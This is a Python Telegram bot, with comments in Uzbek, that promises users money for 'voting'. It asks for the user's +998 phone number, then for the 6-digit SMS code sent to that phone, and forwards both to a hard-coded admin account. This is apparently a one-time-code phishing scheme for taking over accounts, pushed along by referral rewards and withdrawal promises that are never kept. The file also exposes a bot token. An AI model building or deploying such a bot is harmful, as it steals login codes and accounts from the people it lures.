from telegram import Update, KeyboardButton, ReplyKeyboardMarkup, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters
import re

TOKEN = "8022307088:AAF4pj3HRskIOnM34tpCe8huqxMIxgFr7dQ"  # Tokeningizni shu yerga yozing
ADMIN_ID = 6593318018  # O'zingizning Telegram ID raqamingizni yozing

waiting_for_phone = {}
waiting_for_code = {}
user_balances = {}
invited_users = set()  # Referal orqali kelganlar ro‘yxati

# /start komandasi
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    name = update.effective_user.first_name

    # Referal orqali kelgan foydalanuvchini aniqlash
    if context.args:
        referrer_id = int(context.args[0])
        if user_id != referrer_id and user_id not in user_balances and user_id not in invited_users:
            invited_users.add(user_id)
            user_balances[referrer_id] = user_balances.get(referrer_id, 0) + 2000
            await context.bot.send_message(referrer_id,
                                           f"🎉 Sizning referalingiz ({name}) botga qo‘shildi!\n💸 Sizga 2000 so‘m qo‘shildi!")

    # Foydalanuvchining balansini boshlaymiz agar yo‘q bo‘lsa
    user_balances.setdefault(user_id, 0)

    keyboard = [
        [KeyboardButton("📤 Ovoz berish")],
        [KeyboardButton("💰 Balans"), KeyboardButton("📥 Pulni yechib olish")],
        [KeyboardButton("🔗 Referal")]
    ]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    await update.message.reply_text("Assalomu alaykum! Kerakli bo'limni tanlang:", reply_markup=reply_markup)

# Asosiy menyu tugmalari ishlovchisi
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    user_id = update.message.from_user.id
    name = update.message.from_user.first_name

    if text == "📤 Ovoz berish":
        waiting_for_phone[user_id] = True
        await update.message.reply_text("📞 Iltimos, telefon raqamingizni yuboring (+998 bilan boshlansin):")

    elif text == "💰 Balans":
        balance = user_balances.get(user_id, 0)
        await update.message.reply_text(f"💰 Sizning balansingiz: {balance} so'm")

    elif text == "📥 Pulni yechib olish":
        balance = user_balances.get(user_id, 0)
        if balance >= 20000:
            await update.message.reply_text("✅ Pul yechib olish so‘rovi qabul qilindi. Tez orada siz bilan bog‘lanamiz.")
            # Optionally, bu yerda adminga bildirish yuborish mumkin
        else:
            await update.message.reply_text("❌ Pulni yechib olish uchun hisobingizda mablag' yetarli emas. (min: 40000 UZS)")

    elif text == "🔗 Referal":
        link = f"https://t.me/{context.bot.username}?start={user_id}"
        await update.message.reply_text(
            f"🔗 Sizning referal havolangiz:\n{link}\n\n"
            f"📣 Ushbu havolani do‘stlaringizga yuboring. Har bir taklif uchun 2000 so‘m olasiz!"
        )

    else:
        if user_id in waiting_for_phone and waiting_for_phone[user_id]:
            if re.match(r'^\+998\d{9}$', text):
                waiting_for_phone[user_id] = False
                keyboard = InlineKeyboardMarkup([
                    [InlineKeyboardButton("✅ Ha", callback_data=f"approve_{user_id}"),
                     InlineKeyboardButton("❌ Yo'q", callback_data=f"reject_{user_id}")]
                ])
                await context.bot.send_message(
                    ADMIN_ID,
                    f"📤 Yangi foydalanuvchi raqam yubordi:\n"
                    f"👤 Ismi: {name}\n"
                    f"🆔 ID: {user_id}\n"
                    f"📞 Raqami: {text}",
                    reply_markup=keyboard
                )
                await update.message.reply_text("✅ Raqamingiz qabul qilindi. Admin tasdiqlashini kuting.")
            else:
                await update.message.reply_text("❌ Noto‘g‘ri format. Raqamni +998 bilan boshlang.")

        elif user_id in waiting_for_code and waiting_for_code[user_id]:
            if re.match(r'^\d{6}$', text):
                waiting_for_code[user_id] = False
                keyboard = InlineKeyboardMarkup([
                    [InlineKeyboardButton("✅ Tasdiqlash", callback_data=f"confirm_{user_id}"),
                     InlineKeyboardButton("❌ Rad etish", callback_data=f"deny_{user_id}")]
                ])
                await context.bot.send_message(
                    ADMIN_ID,
                    f"📩 Foydalanuvchi {name} ({user_id}) kod yubordi:\n🔢 Kod: {text}",
                    reply_markup=keyboard
                )
                await update.message.reply_text("✅ Kod qabul qilindi. Admin tasdiqlashini kuting.")
            else:
                await update.message.reply_text("❌ Kod 6 xonali bo‘lishi kerak.")
        else:
            await update.message.reply_text("❓ Menyu tugmalaridan birini tanlang.")

# Admin tugmalarining ishlovchisi
async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    if query.data.startswith("approve_"):
        user_id = int(query.data.split("_")[1])
        waiting_for_code[user_id] = True
        await context.bot.send_message(user_id, "📩 Telefon raqamingizga yuborilgan 6 xonali SMS kodni kiriting:")
        await query.edit_message_text("✅ Foydalanuvchidan kod so‘raldi.")

    elif query.data.startswith("reject_"):
        user_id = int(query.data.split("_")[1])
        await context.bot.send_message(user_id, "❌ Siz avval ovoz bergansiz.")
        await query.edit_message_text("❌ Foydalanuvchi rad etildi.")

    elif query.data.startswith("confirm_"):
        user_id = int(query.data.split("_")[1])
        user_balances[user_id] = user_balances.get(user_id, 0) + 35000
        await context.bot.send_message(user_id, "✅ Kod tasdiqlandi! Balansingizga 35000 UZS qo‘shildi.")
        await query.edit_message_text("✅ Foydalanuvchi kodi tasdiqlandi. Balans qo‘shildi.")

    elif query.data.startswith("deny_"):
        user_id = int(query.data.split("_")[1])
        await context.bot.send_message(user_id, "❌ Kod noto‘g‘ri yoki rad etildi.")
        await query.edit_message_text("❌ Kod rad etildi.")

# Botni ishga tushirish
app = ApplicationBuilder().token(TOKEN).build()
app.add_handler(CommandHandler("start", start))
app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
app.add_handler(CallbackQueryHandler(button_callback))

print("✅ Bot ishga tushdi...")
app.run_polling()
